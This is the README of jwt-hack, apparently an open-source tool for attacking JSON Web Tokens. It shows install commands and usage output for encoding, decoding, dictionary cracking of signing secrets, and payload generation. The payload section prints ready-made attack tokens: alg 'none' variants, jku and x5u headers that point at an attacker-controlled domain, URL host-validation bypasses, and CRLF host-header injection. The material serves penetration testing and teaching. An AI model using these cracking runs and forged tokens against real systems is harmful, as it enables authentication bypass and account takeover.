<h1 align="center">
  <br>
  <a href=""><img src="https://user-images.githubusercontent.com/13212227/91675684-26561500-eb78-11ea-9f59-d904d743afae.png" alt="" width="260px;"></a>
  <br>
  Hack the JWT(JSON Web Token)
  <br>
  <img src="https://img.shields.io/github/v/release/hahwul/jwt-hack?style=flat">
  <img src="https://github.com/hahwul/jwt-hack/actions/workflows/go.yml/badge.svg">
  <img src="https://github.com/hahwul/jwt-hack/actions/workflows/codeql-analysis.yml/badge.svg">
  <a href="https://codecov.io/gh/hahwul/jwt-hack"><img src="https://codecov.io/gh/hahwul/jwt-hack/branch/main/graph/badge.svg"/></a>
  <img src="https://app.codacy.com/project/badge/Grade/77bdf42ef06a430a9bfb46f15eb86626">
  <a href="https://goreportcard.com/report/github.com/hahwul/jwt-hack"><img src="https://goreportcard.com/badge/github.com/hahwul/jwt-hack"></a>
  <a href="https://twitter.com/intent/follow?screen_name=hahwul"><img src="https://img.shields.io/twitter/follow/hahwul?style=flat&logo=twitter"></a>
</h1>

## Installation
### from the source
**go1.17**
```
go install github.com/hahwul/jwt-hack@latest
```

**go1.16**
```
GO111MODULE=on go get -u github.com/hahwul/jwt-hack
```

### homebrew
```
brew tap hahwul/jwt-hack
brew install jwt-hack
```

### snapcraft
```
sudo snap install jwt-hack
```

## Usage
```
   d8p 8d8   d88 888888888          888  888 ,8b.     doooooo 888  ,dP
   88p 888,o.d88    '88d     ______ 88888888 88'8o    d88     888o8P'
   88P 888P`Y8b8   '888      XXXXXX 88P  888 88PPY8.  d88     888 Y8L
88888' 88P   YP8 '88p               88P  888 8b   `Y' d888888 888  `8p
-------------------------
Hack the JWT(JSON Web Token) | by @hahwul | v1.0.0

Usage:
  jwt-hack [command]

Available Commands:
  crack       Cracking JWT Token
  decode      Decode JWT to JSON
  encode      Encode json to JWT
  help        Help about any command
  payload     Generate JWT Attack payloads
  version     Show version

Flags:
  -h, --help   help for jwt-hack
```

![1414](https://user-images.githubusercontent.com/13212227/97078000-8a023900-1623-11eb-844f-ee92399be392.png)

## Encode mode(JSON to JWT)
```
▶ jwt-hack encode '{"json":"format"}' --secret={YOUR_SECRET}
```

e.g
```
▶ jwt-hack encode '{"test":"1234"}' --secret=asdf
   d8p 8d8   d88 888888888          888  888 ,8b.     doooooo 888  ,dP
   88p 888,o.d88    '88d     ______ 88888888 88'8o    d88     888o8P'
   88P 888P`Y8b8   '888      XXXXXX 88P  888 88PPY8.  d88     888 Y8L
88888' 88P   YP8 '88p               88P  888 8b   `Y' d888888 888  `8p
-------------------------
INFO[0000] Encoded result                                algorithm=HS256
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZXN0IjoiMTIzNCJ9.JOL1SYkRZYUz9GVny-DgoDj60C0RLz929h1_fFcpqQA
```

## Decode mode(JWT to JSON)
```
▶ jwt-hack decode {JWT_CODE}
```

e.g
```
▶ jwt-hack decode eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

   d8p 8d8   d88 888888888          888  888 ,8b.     doooooo 888  ,dP
   88p 888,o.d88    '88d     ______ 88888888 88'8o    d88     888o8P'
   88P 888P`Y8b8   '888      XXXXXX 88P  888 88PPY8.  d88     888 Y8L
88888' 88P   YP8 '88p               88P  888 8b   `Y' d888888 888  `8p
-------------------------
INFO[0000] Decoded data(claims)                          header="{\"alg\":\"HS256\",\"typ\":\"JWT\"}" method="&{HS256 5}"
{"iat":1516239022,"name":"John Doe","sub":"1234567890"}
```

## Crack mode(Dictionary attack / BruteForce)
```
▶ jwt-hack crack -w {WORDLIST} {JWT_CODE}
```

e.g
```
▶ jwt-hack crack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.5mhBHqs5_DTLdINd9p5m7ZJ6XD0Xc55kIaCRY5r6HRA -w samples/wordlist.txt

   d8p 8d8   d88 888888888          888  888 ,8b.     doooooo 888  ,dP
   88p 888,o.d88    '88d     ______ 88888888 88'8o    d88     888o8P'
   88P 888P`Y8b8   '888      XXXXXX 88P  888 88PPY8.  d88     888 Y8L
88888' 88P   YP8 '88p               88P  888 8b   `Y' d888888 888  `8p
-------------------------
[*] Start dict cracking mode
INFO[0000] Loaded words (remove duplicated)              size=16
INFO[0000] Invalid signature                             word=fas
INFO[0000] Invalid signature                             word=asd
INFO[0000] Invalid signature                             word=1234
INFO[0000] Invalid signature                             word=efq
INFO[0000] Invalid signature                             word=asdf
INFO[0000] Invalid signature                             word=2q
INFO[0000] Found! Token signature secret is test         Signature=Verified Word=test
INFO[0000] Invalid signature                             word=dfas
INFO[0000] Invalid signature                             word=ga
INFO[0000] Invalid signature                             word=f
INFO[0000] Invalid signature                             word=ds
INFO[0000] Invalid signature                             word=sad
INFO[0000] Invalid signature                             word=qsf
...
INFO[0000] Invalid signature                             word=password
INFO[0000] Invalid signature                             word=error
INFO[0000] Invalid signature                             word=calendar
[+] Found! JWT signature secret: test
[+] Finish crack mode
```

## Payload mode(Alg none attack, etc..)
```
▶ jwt-hack payload {JWT_CODE}
```

for jku and x5u (what is? [readme this slide](https://www.slideshare.net/snyff/jwt-jku-x5u))
* `--jwk-attack` : A attack payload domain for jku&x5u (e.g hahwul.com)
* `--jwk-trust` : jku&x5u protocol (http/https) (default "https")
* `--jwk-protocol` : A trusted domain for jku&x5u (e.g google.com)

e.g
```
▶ jwt-hack payload eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkhBSFdVTCIsInJlZnJlc2hfdG9rZW4iOiJhYmNkMTIzNDU0NjQiLCJpYXQiOjE1MTYyMzkwMjJ9.5m9zFPGPU0LMdTTLCR7jXMP8357nNAa0z8ABJJE3r3c --jwk-attack attack.hahwul.com --jwk-protocol https --jwk-trust trust.hahwul.com

INFO[0000] Generate none payload                         header="{\"alg\":\"none\",\"typ\":\"JWT\"}" payload=none
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkhBSFdVTCIsInJlZnJlc2hfdG9rZW4iOiJhYmNkMTIzNDU0NjQiLCJpYXQiOjE1MTYyMzkwMjJ9.

INFO[0000] Generate NonE payload                         header="{\"alg\":\"NonE\",\"typ\":\"JWT\"}" payload=NonE
eyJhbGciOiJOb25FIiwidHlwIjoiSldUIn0=.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkhBSFdVTCIsInJlZnJlc2hfdG9rZW4iOiJhYmNkMTIzNDU0NjQiLCJpYXQiOjE1MTYyMzkwMjJ9.

INFO[0000] Generate NONE payload                         header="{\"alg\":\"NONE\",\"typ\":\"JWT\"}" payload=NONE
eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0=.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkhBSFdVTCIsInJlZnJlc2hfdG9rZW4iOiJhYmNkMTIzNDU0NjQiLCJpYXQiOjE1MTYyMzkwMjJ9.

INFO[0000] Generate jku + basic payload                  header="{\"alg\":\"hs256\",\"jku\":\"attack.hahwul.com\",\"typ\":\"JWT\"}" payload=jku
eyJhbGciOiJoczI1NiIsImprdSI6ImF0dGFjay5oYWh3dWwuY29tIiwidHlwIjoiSldUIn0=.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkhBSFdVTCIsInJlZnJlc2hfdG9rZW4iOiJhYmNkMTIzNDU0NjQiLCJpYXQiOjE1MTYyMzkwMjJ9.

INFO[0000] Generate jku host validation payload          header="{\"alg\":\"hs256\",\"jku\":\"https://trust.hahwul.comZattack.hahwul.com\",\"typ\":\"JWT\"}" payload=jku
eyJhbGciOiJoczI1NiIsImprdSI6Imh0dHBzOi8vdHJ1c3QuaGFod3VsLmNvbVphdHRhY2suaGFod3VsLmNvbSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkhBSFdVTCIsInJlZnJlc2hfdG9rZW4iOiJhYmNkMTIzNDU0NjQiLCJpYXQiOjE1MTYyMzkwMjJ9.

INFO[0000] Generate jku host validation payload          header="{\"alg\":\"hs256\",\"jku\":\"https://trust.hahwul.com@attack.hahwul.com\",\"typ\":\"JWT\"}" payload=jku
eyJhbGciOiJoczI1NiIsImprdSI6Imh0dHBzOi8vdHJ1c3QuaGFod3VsLmNvbUBhdHRhY2suaGFod3VsLmNvbSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkhBSFdVTCIsInJlZnJlc2hfdG9rZW4iOiJhYmNkMTIzNDU0NjQiLCJpYXQiOjE1MTYyMzkwMjJ9.

INFO[0000] Generate jku host header injection (w/CRLF) payload  header="{\"alg\":\"hs256\",\"jku\":\"https://trust.hahwul.com%0d0aHost: attack.hahwul.com\",\"typ\":\"JWT\"}" payload=jku
eyJhbGciOiJoczI1NiIsImprdSI6Imh0dHBzOi8vdHJ1c3QuaGFod3VsLmNvbSUwZDBhSG9zdDogYXR0YWNrLmhhaHd1bC5jb20iLCJ0eXAiOiJKV1QifQ==.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkhBSFdVTCIsInJlZnJlc2hfdG9rZW4iOiJhYmNkMTIzNDU0NjQiLCJpYXQiOjE1MTYyMzkwMjJ9.

INFO[0000] Generate x5u + basic payload                  header="{\"alg\":\"hs256\",\"x5u\":\"attack.hahwul.com\",\"typ\":\"JWT\"}" payload=x5u
eyJhbGciOiJoczI1NiIsIng1dSI6ImF0dGFjay5oYWh3dWwuY29tIiwidHlwIjoiSldUIn0=.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkhBSFdVTCIsInJlZnJlc2hfdG9rZW4iOiJhYmNkMTIzNDU0NjQiLCJpYXQiOjE1MTYyMzkwMjJ9.

INFO[0000] Generate x5u host validation payload          header="{\"alg\":\"hs256\",\"x5u\":\"https://trust.hahwul.comZattack.hahwul.com\",\"typ\":\"JWT\"}" payload=x5u
eyJhbGciOiJoczI1NiIsIng1dSI6Imh0dHBzOi8vdHJ1c3QuaGFod3VsLmNvbVphdHRhY2suaGFod3VsLmNvbSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkhBSFdVTCIsInJlZnJlc2hfdG9rZW4iOiJhYmNkMTIzNDU0NjQiLCJpYXQiOjE1MTYyMzkwMjJ9.

INFO[0000] Generate x5u host validation payload          header="{\"alg\":\"hs256\",\"x5u\":\"https://trust.hahwul.com@attack.hahwul.com\",\"typ\":\"JWT\"}" payload=x5u
eyJhbGciOiJoczI1NiIsIng1dSI6Imh0dHBzOi8vdHJ1c3QuaGFod3VsLmNvbUBhdHRhY2suaGFod3VsLmNvbSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkhBSFdVTCIsInJlZnJlc2hfdG9rZW4iOiJhYmNkMTIzNDU0NjQiLCJpYXQiOjE1MTYyMzkwMjJ9.

INFO[0000] Generate x5u host header injection (w/CRLF) payload  header="{\"alg\":\"hs256\",\"x5u\":\"https://trust.hahwul.com%0d0aHost: attack.hahwul.com\",\"typ\":\"JWT\"}" payload=x5u
eyJhbGciOiJoczI1NiIsIng1dSI6Imh0dHBzOi8vdHJ1c3QuaGFod3VsLmNvbSUwZDBhSG9zdDogYXR0YWNrLmhhaHd1bC5jb20iLCJ0eXAiOiJKV1QifQ==.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkhBSFdVTCIsInJlZnJlc2hfdG9rZW4iOiJhYmNkMTIzNDU0NjQiLCJpYXQiOjE1MTYyMzkwMjJ9.
```
